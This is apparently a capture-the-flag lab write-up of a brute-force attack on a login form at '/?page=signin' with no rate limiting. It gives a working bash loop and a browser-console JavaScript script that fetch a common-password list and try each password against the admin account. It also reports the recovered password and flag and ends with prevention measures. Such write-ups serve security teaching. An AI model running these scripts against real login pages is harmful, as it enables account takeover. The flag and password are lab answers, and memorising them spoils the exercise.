# Brute Force Authentication Vulnerability

## Overview
The login form at `/?page=signin` is vulnerable to brute force attacks, allowing attackers to guess admin credentials with no rate limiting.

---

## How It Works

1. **Finding the Target:**  
   In a previous breach, we gained access to the members page, which revealed that "admin" is a valid username.
2. **Attack:**  
   Login requests are sent like this:
   ```
   /?page=signin&username=admin&password=<PASSWORD>&Login=Login
   ```
   A failed login shows "WrongAnswer.gif".

---

## Exploitation Methods

### **Method 1: Bash Script with Password List**

- Download a password list from GitHub:
  ```bash
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O pwdlist.txt
  ```
- Use this brute force loop:
  ```bash
  for pwd in $(cat pwdlist.txt); do
    resp=$(curl -s "http://<IP_ADDRESS>/?page=signin&username=admin&password=$pwd&Login=Login")
    if [[ "$resp" == *"The flag is :"* ]]; then
      flag=$(echo "$resp" | awk -F 'The flag is :' '{print $2}' | head -n1 | cut -c2-65)
      echo "Success! Username: admin | Password: $pwd | Flag: $flag"
      break
    fi
  done
  ```
- Password `shadow` is found to work.

---

### **Method 2: JavaScript in Google Chrome Console**

1. Open the login page in Chrome.
2. Open Developer Tools (F12), go to the **Console** tab.
3. Paste and run this script (it fetches the same password list from GitHub and tries each password for you):

   ```javascript
   // URL to password list on GitHub
   const passwordListUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt';

   // Format current time
   const getCurrentTime = () => {
     const now = new Date();
     return now.toISOString().split('T')[0] + ' ' + now.toTimeString().split(' ')[0];
   };

   // Try a single password
   async function tryPassword(password) {
     try {
       const timestamp = getCurrentTime();
       console.log(`[${timestamp}] Testing: "${password}"`);
       
       const url = `index.php?page=signin&username=admin&password=${encodeURIComponent(password)}&Login=Login`;
       const response = await fetch(url);
       const html = await response.text();
       
       // Check for login success (no error image)
       if (!html.includes('WrongAnswer.gif')) {
         // Extract flag if present
         const flagMatch = html.match(/The flag is : ([a-f0-9]+)/i);
         const flag = flagMatch ? flagMatch[1] : 'Not found';
         
         console.log(`✅ SUCCESS! Password: "${password}", Flag: ${flag}`);
         
         // Display flag in a box
         console.log(`
   ┌${'─'.repeat(flag.length + 10)}┐
   │  🚩 FLAG: ${flag}  │
   └${'─'.repeat(flag.length + 10)}┘
         `);
         
         return true;
       }
       return false;
     } catch (error) {
       console.log(`⚠️ Error with "${password}": ${error.message}`);
       return false;
     }
   }

   // Fetch passwords from GitHub
   async function fetchPasswords() {
     try {
       console.log(`Fetching passwords from GitHub...`);
       const response = await fetch(passwordListUrl);
       
       if (!response.ok) {
         throw new Error(`Failed to fetch: ${response.status}`);
       }
       
       const text = await response.text();
       const passwords = text.split('\n')
         .map(pwd => pwd.trim())
         .filter(pwd => pwd.length > 0);
       
       console.log(`Fetched ${passwords.length} passwords`);
       return passwords;
     } catch (error) {
       console.log(`Error fetching passwords: ${error.message}`);
       // Fallback to some basic passwords if GitHub fetch fails
       return ['admin', 'password', '123456', 'shadow', 'root'];
     }
   }

   // Test all passwords with small delay
   async function bruteForce() {
     console.log(`Starting brute force attack at ${getCurrentTime()}...`);
     
     // Get passwords from GitHub
     const passwords = await fetchPasswords();
     
     for (const password of passwords) {
       // Add small delay to avoid overwhelming server
       await new Promise(resolve => setTimeout(resolve, 30));
       
       // Stop if successful
       if (await tryPassword(password)) {
         break;
       }
     }
     
     console.log(`Brute force completed at ${getCurrentTime()}`);
   }

   // Start the brute force
   bruteForce();

   // Utility to test individual passwords
   window.testPassword = (password) => tryPassword(password);
   ```

---

## Result

- **Username:** admin  
- **Password:** shadow  
- **Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

---

## Prevention

1. **Account Lockout:** Temporarily disable accounts after multiple failures.
2. **Strong Password Policy:** Require complex, non-common passwords.
3. **MFA:** Add Multi-Factor Authentication for all users.
4. **CAPTCHA:** Use CAPTCHA after failed logins.
5. **Rate Limit:** Restrict login attempts per IP.
6. **Monitoring:** Alert on brute force patterns.

---

## Resources

- Password list source:  
  [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt)
